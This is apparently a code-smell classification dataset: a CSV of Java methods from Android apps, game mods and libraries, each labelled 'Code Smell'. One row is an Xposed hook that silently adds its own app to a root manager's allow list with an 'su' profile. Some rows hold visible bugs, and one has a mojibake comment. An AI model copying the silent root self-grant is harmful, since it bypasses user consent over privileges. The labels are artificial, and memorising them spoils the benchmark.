text,label,text_label
"protected void drawKeyPopupHint(@NonNull final Key key,@NonNull final Canvas canvas,@NonNull final Paint paint,@NonNull final KeyDrawParams params){
  if (TextUtils.isEmpty(mKeyPopupHintLetter)) {
    return;
  }
  final int keyWidth=key.getDrawWidth();
  final int keyHeight=key.getHeight();
  final float labelCharWidth=TypefaceUtils.getReferenceCharWidth(paint);
  final float hintX;
  final float hintBaseline=paint.ascent();
  paint.setTypeface(params.mTypeface);
  paint.setTextSize(params.mHintLetterSize);
  paint.setColor(params.mHintLabelColor);
  paint.setTextAlign(Align.CENTER);
  if (mColors.getThemeStyle().equals(STYLE_ROUNDED)) {
    if (key.getBackgroundType() == Key.BACKGROUND_TYPE_SPACEBAR)     hintX=keyWidth + hintBaseline + labelCharWidth * 0.1f;
 else     hintX=key.hasFunctionalBackground() || key.hasActionKeyBackground() ? keyWidth / 2.0f : keyWidth - mKeyHintLetterPadding - labelCharWidth / 2.0f;
  }
 else {
    hintX=keyWidth - mKeyHintLetterPadding - TypefaceUtils.getReferenceCharWidth(paint) / 2.0f;
  }
  final float hintY=keyHeight - mKeyPopupHintLetterPadding;
  canvas.drawText(mKeyPopupHintLetter,hintX,hintY,paint);
}",1,Code Smell
"private static boolean searchForClass(Exprent exprent,VarType classType){
  List<Exprent> lst=exprent.getAllExprents(true);
  lst.add(exprent);
  String classname=classType.value;
  for (  Exprent expr : lst) {
    boolean res=false;
switch (expr.type) {
case Exprent.EXPRENT_CONST:
      ConstExprent constExpr=(ConstExprent)expr;
    res=(VarType.VARTYPE_CLASS.equals(constExpr.getConstType()) && classname.equals(constExpr.getValue()) || classType.equals(constExpr.getConstType()));
  break;
case Exprent.EXPRENT_FIELD:
res=classname.equals(((FieldExprent)expr).getClassname());
break;
case Exprent.EXPRENT_INVOCATION:
res=classname.equals(((InvocationExprent)expr).getClassname());
break;
case Exprent.EXPRENT_NEW:
VarType newType=expr.getExprType();
res=newType.type == CodeConstants.TYPE_OBJECT && classname.equals(newType.value);
break;
case Exprent.EXPRENT_VAR:
VarExprent varExpr=(VarExprent)expr;
if (varExpr.isDefinition()) {
VarType varType=varExpr.getVarType();
if (classType.equals(varType) || (varType.arrayDim > 0 && classType.value.equals(varType.value))) {
res=true;
}
}
}
if (res) {
return true;
}
}
return false;
}",1,Code Smell
"/** 
 * 杞崲 appPackage锛屽鍔犻檮鍔犳暟鎹紝骞惰幏鍙栧疄闄呭競鍦洪渶瑕佺殑 Item 瀵硅薄
 * @param item             appPackage item
 * @param metaList         鍏冧俊鎭
 * @param countVersionList 鐗堟湰璁℃暟鍒楄〃
 * @return
 */
private MarketAppItemDTO transform(AppPackageDO item,List<AppMetaDO> metaList,List<AppPackageVersionCountDTO> countVersionList){
  AppPackageDTO mid=appPackageDtoConvert.to(item);
  if (Objects.nonNull(mid)) {
    AppMetaDO appMetaDO=metaList.stream().filter(m -> StringUtils.equals(m.getAppId(),mid.getAppId())).findFirst().orElse(null);
    if (Objects.nonNull(appMetaDO)) {
      JSONObject optionMap=appOptionService.getOptionMap(appMetaDO.getAppId());
      String name=appMetaDO.getAppId();
      if (StringUtils.isNotEmpty(optionMap.getString(""name""))) {
        name=optionMap.getString(""name"");
      }
      mid.setAppName(name);
      mid.setAppOptions(optionMap);
    }
  }
  MarketAppItemDTO result=new MarketAppItemDTO();
  ClassUtil.copy(mid,result);
  List<AppPackageVersionCountDTO> filteredCountVersion=countVersionList.stream().filter(countVersion -> item.getAppId().equals(countVersion.getAppId())).collect(Collectors.toList());
  if (filteredCountVersion.size() > 0) {
    result.setPackageCount(filteredCountVersion.get(0).getPackageCount());
  }
 else {
    result.setPackageCount(0L);
  }
  return result;
}",1,Code Smell
"@Override public void playerWillDestroy(Level worldIn,BlockPos pos,BlockState state,Player player){
  Axis axis=state.getValue(FACING).getAxis();
  Direction direction=Direction.get(AxisDirection.POSITIVE,axis);
  BlockPos pistonHead=null;
  BlockPos pistonBase=null;
  for (  int modifier : new int[]{1,-1}) {
    for (int offset=modifier; modifier * offset < MechanicalPistonBlock.maxAllowedPistonPoles(); offset+=modifier) {
      BlockPos currentPos=pos.relative(direction,offset);
      BlockState block=worldIn.getBlockState(currentPos);
      if (isExtensionPole(block) && axis == block.getValue(FACING).getAxis())       continue;
      if (isPiston(block) && block.getValue(BlockStateProperties.FACING).getAxis() == axis)       pistonBase=currentPos;
      if (isPistonHead(block) && block.getValue(BlockStateProperties.FACING).getAxis() == axis)       pistonHead=currentPos;
      break;
    }
  }
  if (pistonHead != null && pistonBase != null && worldIn.getBlockState(pistonHead).getValue(BlockStateProperties.FACING) == worldIn.getBlockState(pistonBase).getValue(BlockStateProperties.FACING)) {
    final BlockPos basePos=pistonBase;
    BlockPos.betweenClosedStream(pistonBase,pistonHead).filter(p -> !p.equals(pos) && !p.equals(basePos)).forEach(p -> worldIn.destroyBlock(p,!player.isCreative()));
    worldIn.setBlockAndUpdate(basePos,worldIn.getBlockState(basePos).setValue(MechanicalPistonBlock.STATE,PistonState.RETRACTED));
    BlockEntity be=worldIn.getBlockEntity(basePos);
    if (be instanceof MechanicalPistonBlockEntity) {
      MechanicalPistonBlockEntity baseBE=(MechanicalPistonBlockEntity)be;
      baseBE.offset=0;
      baseBE.onLengthBroken();
    }
  }
  super.playerWillDestroy(worldIn,pos,state,player);
}",1,Code Smell
"private static ApacheHttpClientRequest getApacheHttpClientRequest(ClassicHttpRequest request,Scope scope){
  HttpHost host=null;
  if (scope.route.getTargetHost() != null) {
    host=scope.route.getTargetHost();
  }
 else   if (scope.clientContext.getHttpRoute().getTargetHost() != null) {
    host=scope.clientContext.getHttpRoute().getTargetHost();
  }
  if (host != null && ((host.getSchemeName().equals(""https"") && host.getPort() == 443) || (host.getSchemeName().equals(""http"") && host.getPort() == 80))) {
    host=new HttpHost(host.getSchemeName(),host.getHostName(),-1);
  }
  return new ApacheHttpClientRequest(host,request);
}",1,Code Smell
"private void updateSendButton(){
  int size=(int)(Math.min(AndroidUtilities.displaySize.x,AndroidUtilities.displaySize.y) / 2 / AndroidUtilities.density);
  if (importingStickers != null) {
    previewSendButton.setText(LocaleController.getString(""ImportStickersRemove"",R.string.ImportStickersRemove));
    previewSendButton.setTextColor(getThemedColor(Theme.key_text_RedBold));
    stickerImageView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER,0,0,0,30));
    stickerEmojiTextView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER,0,0,0,30));
    previewSendButton.setVisibility(View.VISIBLE);
    previewSendButtonShadow.setVisibility(View.VISIBLE);
  }
 else   if (delegate != null && (stickerSet == null || !stickerSet.set.masks)) {
    previewSendButton.setText(LocaleController.getString(""SendSticker"",R.string.SendSticker));
    stickerImageView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER,0,0,0,30));
    stickerEmojiTextView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER,0,0,0,30));
    previewSendButton.setVisibility(View.VISIBLE);
    previewSendButtonShadow.setVisibility(View.VISIBLE);
  }
 else {
    previewSendButton.setText(LocaleController.getString(""Close"",R.string.Close));
    stickerImageView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER));
    stickerEmojiTextView.setLayoutParams(LayoutHelper.createFrame(size,size,Gravity.CENTER));
    previewSendButton.setVisibility(View.GONE);
    previewSendButtonShadow.setVisibility(View.GONE);
  }
}",1,Code Smell
"public static Integer getColorOrNull(String key){
  Integer color=currentColors.get(key);
  if (color == null) {
    String fallbackKey=fallbackKeys.get(key);
    if (fallbackKey != null) {
      color=currentColors.get(key);
    }
    if (color == null) {
      color=defaultColors.get(key);
    }
  }
  if (color != null && (key_windowBackgroundWhite.equals(key) || key_windowBackgroundGray.equals(key) || key_actionBarDefault.equals(key)|| key_actionBarDefaultArchived.equals(key))) {
    color|=0xff000000;
  }
  return color;
}",1,Code Smell
"/** 
 * Append message to memory cache
 * @param memStatsHolder    statistical information object
 * @param partitionId       the partitionId for append messages
 * @param keyCode           the filter item hash code
 * @param timeRecv          the received timestamp
 * @param indexEntry        the stored index entry
 * @param dataEntryLength   the stored data entry length
 * @param dataEntry         the stored data entry
 * @param appendResult      the append result
 * @return    the process result
 */
public boolean appendMsg(MsgStoreStatsHolder memStatsHolder,int partitionId,int keyCode,long timeRecv,ByteBuffer indexEntry,int dataEntryLength,ByteBuffer dataEntry,AppendResult appendResult){
  long dataOffset;
  long indexOffset;
  int indexSizePos;
  boolean isAppended=true;
  boolean fullDataSize=false;
  boolean fullIndexSize=false;
  boolean fullCount=false;
  this.writeLock.lock();
  try {
    fullDataSize=(this.cacheDataOffset.get() + dataEntryLength > this.maxDataCacheSize);
    fullCount=(this.curMessageCount.get() + 1 > maxAllowedMsgCount);
    fullIndexSize=(this.cacheIndexOffset.get() + DataStoreUtils.STORE_INDEX_HEAD_LEN > this.maxIndexCacheSize);
    if (fullDataSize || fullCount || fullIndexSize) {
      isAppended=false;
      return false;
    }
    indexOffset=this.writeIndexStartPos + this.cacheIndexOffset.get();
    dataOffset=this.writeDataStartPos + this.cacheDataOffset.get();
    indexEntry.putLong(DataStoreUtils.INDEX_POS_DATAOFFSET,dataOffset);
    dataEntry.putLong(DataStoreUtils.STORE_HEADER_POS_QUEUE_LOGICOFF,indexOffset);
    this.cacheDataSegment.put(dataEntry.array());
    this.cachedIndexSegment.put(indexEntry.array());
    this.cacheDataOffset.getAndAdd(dataEntryLength);
    indexSizePos=cacheIndexOffset.getAndAdd(DataStoreUtils.STORE_INDEX_HEAD_LEN);
    this.queuesMap.put(partitionId,indexSizePos);
    this.keysMap.put(keyCode,indexSizePos);
    this.curMessageCount.getAndIncrement();
    this.rightAppendTime.set(timeRecv);
    if (indexSizePos == 0) {
      this.leftAppendTime.set(timeRecv);
    }
  }
  finally {
    this.writeLock.unlock();
    if (!isAppended) {
      memStatsHolder.addCacheFullType(fullDataSize,fullIndexSize,fullCount);
    }
  }
  appendResult.putAppendResult(indexOffset,dataOffset);
  return true;
}",1,Code Smell
"private void readJournal() throws IOException {
  StrictLineReader reader=new StrictLineReader(new FileInputStream(journalFile),Util.US_ASCII);
  try {
    String magic=reader.readLine();
    String version=reader.readLine();
    String appVersionString=reader.readLine();
    String valueCountString=reader.readLine();
    String blank=reader.readLine();
    if (!MAGIC.equals(magic) || !VERSION_1.equals(version) || !Integer.toString(appVersion).equals(appVersionString)|| !Integer.toString(valueCount).equals(valueCountString)|| !"""".equals(blank)) {
      throw new IOException(""unexpected journal header: ["" + magic + "", ""+ version+ "", ""+ valueCountString+ "", ""+ blank+ ""]"");
    }
    int lineCount=0;
    while (true) {
      try {
        readJournalLine(reader.readLine());
        lineCount++;
      }
 catch (      EOFException endOfJournal) {
        break;
      }
    }
    redundantOpCount=lineCount - lruEntries.size();
    if (reader.hasUnterminatedLine()) {
      rebuildJournal();
    }
 else {
      journalWriter=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(journalFile,true),Util.US_ASCII));
    }
  }
  finally {
    Util.closeQuietly(reader);
  }
}",1,Code Smell
"private int getDaysForMonth(int month,int year){
  if (month == 1) {
    boolean is29Feb=false;
    if (year < 1582) {
      is29Feb=(year < 1 ? year + 1 : year) % 4 == 0;
    }
 else     if (year > 1582) {
      is29Feb=year % 4 == 0 && (year % 100 != 0 || year % 400 == 0);
    }
    return is29Feb ? 29 : 28;
  }
  if (month == 3 || month == 5 || month == 8 || month == 10) {
    return 30;
  }
 else {
    return 31;
  }
}",1,Code Smell
"public void updateItems(){
  final int state=SMSJobController.getInstance(currentAccount).getState();
  oldItems.clear();
  oldItems.addAll(items);
  items.clear();
  items.add(new Item(VIEW_TYPE_HEADER));
  items.add(new Item(VIEW_TYPE_TABLE));
  items.add(Item.asShadow(null));
  items.add(Item.asButton(BUTTON_TERMS,R.drawable.menu_intro,LocaleController.getString(R.string.SmsToS)));
  items.add(Item.asButton(BUTTON_PREMIUM,R.drawable.menu_premium_main,LocaleController.getString(R.string.SmsPremiumBenefits)));
  if (state == SMSJobController.STATE_JOINED && !SMSJobController.getInstance(currentAccount).journal.isEmpty()) {
    items.add(Item.asButton(BUTTON_HISTORY,R.drawable.menu_sms_history,LocaleController.getString(R.string.SmsHistory)).setError(SMSJobController.getInstance(currentAccount).hasError()));
  }
  if (state == SMSJobController.STATE_JOINED) {
    final int simsCount=SMSJobController.getInstance(currentAccount).simsCount();
    if (simsCount > 1 || simsCount == 1 && Build.VERSION.SDK_INT < 22) {
      items.add(Item.asButton(BUTTON_SIM,R.drawable.menu_storage_path,LocaleController.getString(R.string.SmsActiveSim)));
    }
  }
  items.add(Item.asShadow(null));
  items.add(Item.asSwitch(BUTTON_ALLOW_INTERNATIONAL,LocaleController.getString(R.string.SmsAllowInternational)));
  items.add(Item.asShadow(LocaleController.getString(R.string.SmsCostsInfo)));
  if (state != SMSJobController.STATE_NONE) {
    items.add(Item.asButton(BUTTON_DEACTIVATE,0,LocaleController.getString(R.string.SmsDeactivate)).makeRed());
  }
  items.add(Item.asShadow(null));
  if (adapter != null) {
    adapter.setItems(oldItems,items);
  }
}",1,Code Smell
"@Override public boolean remove(int x,int y,int z){
  long tableAddr=this.tableAddr;
  if (tableAddr == 0L) {
    return false;
  }
  long mask=this.tableSize - 1L;
  long flag=positionFlag(x,y,z);
  int searchBucketX=x >> BUCKET_AXIS_BITS;
  int searchBucketY=y >> BUCKET_AXIS_BITS;
  int searchBucketZ=z >> BUCKET_AXIS_BITS;
  long hash=hashPosition(searchBucketX,searchBucketY,searchBucketZ);
  for (long i=0L; ; i++) {
    long bucketAddr=tableAddr + ((hash + i) & mask) * BUCKET_BYTES;
    int bucketX=PUnsafe.getInt(bucketAddr + BUCKET_KEY_OFFSET + KEY_X_OFFSET);
    int bucketY=PUnsafe.getInt(bucketAddr + BUCKET_KEY_OFFSET + KEY_Y_OFFSET);
    int bucketZ=PUnsafe.getInt(bucketAddr + BUCKET_KEY_OFFSET + KEY_Z_OFFSET);
    long value=PUnsafe.getLong(bucketAddr + BUCKET_VALUE_OFFSET);
    if (value == 0L) {
      return false;
    }
 else     if (bucketX != searchBucketX || bucketY != searchBucketY || bucketZ != searchBucketZ) {
      continue;
    }
 else     if ((value & flag) == 0L) {
      return false;
    }
    this.size--;
    if ((value & ~flag) == 0L) {
      this.usedBuckets--;
      this.shiftBuckets(tableAddr,(hash + i) & mask,mask);
    }
 else {
      PUnsafe.putLong(bucketAddr + BUCKET_VALUE_OFFSET,value & ~flag);
    }
    return true;
  }
}
@Override public boolean remove(@NonNull int... point){
  checkArg(point.length == 3);
  return this.remove(point[0],point[1],point[2]);
}",1,Code Smell
"@Override public void onPositionDiscontinuity(@Player.DiscontinuityReason int reason){
  discontinuityReasons.add(reason);
  int currentIndex=player.getCurrentPeriodIndex();
  if (reason == Player.DISCONTINUITY_REASON_PERIOD_TRANSITION || periodIndices.isEmpty() || periodIndices.get(periodIndices.size() - 1) != currentIndex) {
    periodIndices.add(currentIndex);
  }
}",1,Code Smell
"@NonNull @Override protected InteractionResult mobInteract(@NonNull Hand hand,@NonNull GeyserItemStack itemInHand){
  boolean isBaby=isBaby();
  if (!isBaby && itemInHand.asItem() == Items.BOWL) {
    return InteractionResult.SUCCESS;
  }
 else   if (!isBaby && isAlive() && itemInHand.asItem() == Items.SHEARS) {
    return InteractionResult.SUCCESS;
  }
 else   if (isBrown && session.getTagCache().is(ItemTag.SMALL_FLOWERS,itemInHand)) {
    return InteractionResult.SUCCESS;
  }
  return super.mobInteract(hand,itemInHand);
}
",1,Code Smell
"private byte[] convert0() throws IOException {
  ArrayList<PositionList.Entry> sortedPositions=buildSortedPositions();
  ArrayList<LocalList.Entry> methodArgs=extractMethodArguments();
  emitHeader(sortedPositions,methodArgs);
  output.writeByte(DBG_SET_PROLOGUE_END);
  if (annotateTo != null || debugPrint != null) {
    annotate(1,String.format(""%04x: prologue end"",address));
  }
  int positionsSz=sortedPositions.size();
  int localsSz=locals.size();
  int curPositionIdx=0;
  int curLocalIdx=0;
  for (; ; ) {
    curLocalIdx=emitLocalsAtAddress(curLocalIdx);
    curPositionIdx=emitPositionsAtAddress(curPositionIdx,sortedPositions);
    int nextAddrL=Integer.MAX_VALUE;
    int nextAddrP=Integer.MAX_VALUE;
    if (curLocalIdx < localsSz) {
      nextAddrL=locals.get(curLocalIdx).getAddress();
    }
    if (curPositionIdx < positionsSz) {
      nextAddrP=sortedPositions.get(curPositionIdx).getAddress();
    }
    int next=Math.min(nextAddrP,nextAddrL);
    if (next == Integer.MAX_VALUE) {
      break;
    }
    if (next == codeSize && nextAddrL == Integer.MAX_VALUE && nextAddrP == Integer.MAX_VALUE) {
      break;
    }
    if (next == nextAddrP) {
      emitPosition(sortedPositions.get(curPositionIdx++));
    }
 else {
      emitAdvancePc(next - address);
    }
  }
  emitEndSequence();
  return output.toByteArray();
}",1,Code Smell
"public void revokeMessage(final TUIMessageBean message){
  if (!safetyCall()) {
    TUIChatLog.w(TAG,""revokeMessage unSafetyCall"");
    return;
  }
  provider.revokeMessage(message,new IUIKitCallback<Void>(){
    @Override public void onSuccess(    Void data){
      if (message instanceof ReplyMessageBean) {
        modifyRootMessageToRemoveReplyInfo((ReplyMessageBean)message,new IUIKitCallback<Void>(){
          @Override public void onError(          String module,          int errCode,          String errMsg){
            ToastUtil.toastShortMessage(""modify message failed code = "" + errCode + "" message = ""+ errMsg);
          }
        }
);
      }
    }
    @Override public void onError(    String module,    int errCode,    String errMsg){
      if (errCode == ChatProvider.ERR_REVOKE_TIME_LIMIT_EXCEED || errCode == ChatProvider.ERR_REVOKE_TIME_LIMIT_SVR_GROUP || errCode == ChatProvider.ERR_REVOKE_TIME_LIMIT_SVR_MESSAGE) {
        ToastUtil.toastLongMessage(TUIChatService.getAppContext().getString(R.string.send_two_mins));
      }
 else {
        ToastUtil.toastLongMessage(TUIChatService.getAppContext().getString(R.string.revoke_fail) + errCode + ""=""+ errMsg);
      }
    }
  }
);
}
",1,Code Smell
"static View getTopViewInTouch(ConsecutiveScrollerLayout csl,int touchX,int touchY){
  int count=csl.getChildCount();
  View topTouchView=null;
  for (int i=0; i < count; i++) {
    View child=csl.getChildAt(i);
    if (child.getVisibility() == View.VISIBLE && isTouchPointInView(child,touchX,touchY)) {
      if (topTouchView == null) {
        topTouchView=child;
        continue;
      }
      if (ViewCompat.getZ(child) > ViewCompat.getZ(topTouchView) || (ViewCompat.getZ(child) == ViewCompat.getZ(topTouchView) && csl.getDrawingPosition(child) > csl.getDrawingPosition(topTouchView))) {
        topTouchView=child;
      }
    }
  }
  return topTouchView;
}",1,Code Smell
"@Override public void load() throws IOException, InterruptedException {
  int result=Extractor.RESULT_CONTINUE;
  while (result == Extractor.RESULT_CONTINUE && !loadCanceled) {
    ExtractorInput input=null;
    try {
      long position=positionHolder.position;
      dataSpec=buildDataSpec(position);
      length=dataSource.open(dataSpec);
      if (length != C.LENGTH_UNSET) {
        length+=position;
      }
      Uri uri=Assertions.checkNotNull(dataSource.getUri());
      icyHeaders=IcyHeaders.parse(dataSource.getResponseHeaders());
      DataSource extractorDataSource=dataSource;
      if (icyHeaders != null && icyHeaders.metadataInterval != C.LENGTH_UNSET) {
        extractorDataSource=new IcyDataSource(dataSource,icyHeaders.metadataInterval,this);
        icyTrackOutput=icyTrack();
        icyTrackOutput.format(ICY_FORMAT);
      }
      input=new DefaultExtractorInput(extractorDataSource,position,length);
      Extractor extractor=extractorHolder.selectExtractor(input,extractorOutput,uri);
      if (icyHeaders != null && extractor instanceof Mp3Extractor) {
        ((Mp3Extractor)extractor).disableSeeking();
      }
      if (pendingExtractorSeek) {
        extractor.seek(position,seekTimeUs);
        pendingExtractorSeek=false;
      }
      while (result == Extractor.RESULT_CONTINUE && !loadCanceled) {
        loadCondition.block();
        result=extractor.read(input,positionHolder);
        if (input.getPosition() > position + continueLoadingCheckIntervalBytes) {
          position=input.getPosition();
          loadCondition.close();
          handler.post(onContinueLoadingRequestedRunnable);
        }
      }
    }
  finally {
      if (result == Extractor.RESULT_SEEK) {
        result=Extractor.RESULT_CONTINUE;
      }
 else       if (input != null) {
        positionHolder.position=input.getPosition();
      }
      Util.closeQuietly(dataSource);
    }
  }
}",1,Code Smell
"void attachListeners(){
  var parent=getParentFragment();
  if (parent instanceof LogsFragment) {
    logsFragment.binding.appBar.setLifted(!binding.recyclerView.getBorderViewDelegate().isShowingTopBorder());
    binding.recyclerView.getBorderViewDelegate().setBorderVisibilityChangedListener((top,oldTop,bottom,oldBottom) -> logsFragment.binding.appBar.setLifted(!top));
    logsFragment.setOptionsItemSelectListener(item -> {
      int itemId=item.getItemId();
      if (itemId == R.id.menu_scroll_top) {
        scrollToTop(logsFragment);
      }
 else       if (itemId == R.id.menu_scroll_down) {
        scrollToBottom(logsFragment);
      }
 else       if (itemId == R.id.menu_clear) {
        if (ConfigManager.clearLogs(verbose)) {
          logsFragment.showHint(R.string.logs_cleared,true);
          adaptor.fullRefresh();
        }
 else {
          logsFragment.showHint(R.string.logs_clear_failed_2,true);
        }
        return true;
      }
      return false;
    }
);
    View.OnClickListener l=v -> scrollToTop(logsFragment);
    logsFragment.binding.clickView.setOnClickListener(l);
    logsFragment.binding.toolbar.setOnClickListener(l);
  }
}",1,Code Smell
"private void showProgressView(boolean show){
  if (progressView == null) {
    return;
  }
  if (DISABLE_PROGRESS_VIEW && !AndroidUtilities.isTablet() && !isComments&& currentUser == null && LiteMode.isEnabled(LiteMode.FLAGS_CHAT)) {
    animateProgressViewTo=show;
    return;
  }
  if (fragmentOpened && SharedConfig.animationsEnabled()) {
    if (show == animateProgressViewTo) {
      return;
    }
    animateProgressViewTo=show;
    if (show) {
      if (progressView.getVisibility() != View.VISIBLE) {
        progressView.setVisibility(View.VISIBLE);
        progressView.setAlpha(0f);
        progressView.setScaleX(0.3f);
        progressView.setScaleY(0.3f);
      }
      progressView.animate().setListener(null).cancel();
      progressView.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(150).start();
    }
 else {
      progressView.animate().setListener(null).cancel();
      progressView.animate().alpha(0).scaleX(0.3f).scaleY(0.3f).setDuration(150).setListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          progressView.setVisibility(View.INVISIBLE);
        }
      }
).start();
    }
  }
 else {
    animateProgressViewTo=show;
    progressView.setVisibility(show ? View.VISIBLE : View.INVISIBLE);
  }
}",1,Code Smell
"/** 
 * Get a list of bluetooth printers.
 * @return an array of EscPosPrinterCommands
 */
@SuppressLint(""MissingPermission"") @Nullable public BluetoothConnection[] getList(){
  BluetoothConnection[] bluetoothDevicesList=super.getList();
  if (bluetoothDevicesList == null) {
    return null;
  }
  int i=0;
  BluetoothConnection[] printersTmp=new BluetoothConnection[bluetoothDevicesList.length];
  for (  BluetoothConnection bluetoothConnection : bluetoothDevicesList) {
    BluetoothDevice device=bluetoothConnection.getDevice();
    int majDeviceCl=device.getBluetoothClass().getMajorDeviceClass(), deviceCl=device.getBluetoothClass().getDeviceClass();
    if (majDeviceCl == BluetoothClass.Device.Major.IMAGING && (deviceCl == 1664 || deviceCl == BluetoothClass.Device.Major.IMAGING)) {
      printersTmp[i++]=new BluetoothConnection(device);
    }
  }
  BluetoothConnection[] bluetoothPrinters=new BluetoothConnection[i];
  System.arraycopy(printersTmp,0,bluetoothPrinters,0,i);
  return bluetoothPrinters;
}",1,Code Smell
"public J visitMethodInvocation(J.MethodInvocation method,P p){
  J.MethodInvocation m=method;
  m=m.withPrefix(visitSpace(m.getPrefix(),Space.Location.METHOD_INVOCATION_PREFIX,p));
  m=m.withMarkers(visitMarkers(m.getMarkers(),p));
  Statement temp=(Statement)visitStatement(m,p);
  if (!(temp instanceof J.MethodInvocation)) {
    return temp;
  }
 else {
    m=(J.MethodInvocation)temp;
  }
  Expression temp2=(Expression)visitExpression(m,p);
  if (!(temp2 instanceof J.MethodInvocation)) {
    return temp2;
  }
 else {
    m=(J.MethodInvocation)temp2;
  }
  if (m.getPadding().getSelect() != null && m.getPadding().getSelect().getElement() instanceof NameTree && method.getMethodType() != null && method.getMethodType().hasFlags(Flag.Static)) {
    m=m.getPadding().withSelect((JRightPadded<Expression>)(JRightPadded<?>)visitTypeName((JRightPadded<NameTree>)(JRightPadded<?>)m.getPadding().getSelect(),p));
  }
  if (m.getPadding().getSelect() != null) {
    m=m.getPadding().withSelect(visitRightPadded(m.getPadding().getSelect(),JRightPadded.Location.METHOD_SELECT,p));
  }
  if (m.getPadding().getTypeParameters() != null) {
    m=m.getPadding().withTypeParameters(visitContainer(m.getPadding().getTypeParameters(),JContainer.Location.TYPE_PARAMETERS,p));
  }
  m=m.getPadding().withTypeParameters(visitTypeNames(m.getPadding().getTypeParameters(),p));
  m=m.withName((J.Identifier)visitNonNull(m.getName(),p));
  m=m.getPadding().withArguments(visitContainer(m.getPadding().getArguments(),JContainer.Location.METHOD_INVOCATION_ARGUMENTS,p));
  m=m.withMethodType((JavaType.Method)visitType(m.getMethodType(),p));
  return m;
}",1,Code Smell
"@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  Intent launchIntent=((Activity)param.thisObject).getIntent();
  if (launchIntent.hasExtra(Constants.PX_ROOT_EXTRA)) {
    new Thread(() -> {
      try {
        Object nativeObject=ObjenesisHelper.newInstance(NativesClass);
        int[] rootUIDs=(int[])callMethod(nativeObject,""getAllowList"");
        PackageManager packageManager=mContext.getPackageManager();
        int ownUID=packageManager.getPackageUid(BuildConfig.APPLICATION_ID,PackageManager.GET_ACTIVITIES);
        boolean haveRoot=Arrays.stream(rootUIDs).anyMatch(uid -> uid == ownUID);
        if (!haveRoot) {
          Object ownRootProfile=ProfileClass.getConstructor(String.class,int.class,boolean.class,boolean.class,String.class,int.class,int.class,List.class,List.class,String.class,int.class,boolean.class,boolean.class,String.class).newInstance(BuildConfig.APPLICATION_ID,ownUID,true,true,null,0,0,new ArrayList<>(),new ArrayList<>(),""u:r:su:s0"",0,true,true,"""");
          callMethod(nativeObject,""setAppProfile"",ownRootProfile);
          restartPX(launchIntent.hasExtra(""launchApp""));
        }
        Thread.sleep(2000);
        SystemUtils.killSelf();
      }
 catch (      Throwable ignored) {
      }
    }
).start();
  }
}",1,Code Smell
"public static void enableTransparentDialog(Context context,View rootView){
  if (context == null || rootView == null || VERSION.SDK_INT <= 19) {
    return;
  }
  View mainContainer=rootView.findViewById(R.id.settings_preference_fragment_container);
  View mainFrame=rootView.findViewById(R.id.main_frame);
  View itemsContainer=rootView.findViewById(R.id.list);
  View title=rootView.findViewById(R.id.decor_title_container);
  int transparent=ContextCompat.getColor(context,R.color.transparent);
  int semiTransparent=ContextCompat.getColor(context,R.color.semi_grey);
  if (mainContainer instanceof FrameLayout && VERSION.SDK_INT >= 21) {
    mainContainer.setOutlineProvider(ViewOutlineProvider.BACKGROUND);
  }
  if (mainFrame instanceof LinearLayout) {
    mainFrame.setBackgroundColor(transparent);
  }
  if (itemsContainer instanceof VerticalGridView) {
    ((VerticalGridView)itemsContainer).setOnChildLaidOutListener((parent,view,position,id) -> view.setBackgroundResource(R.drawable.transparent_dialog_item_bg));
  }
  if (title instanceof FrameLayout) {
    title.setBackgroundColor(transparent);
    title.setVisibility(View.GONE);
  }
}",1,Code Smell
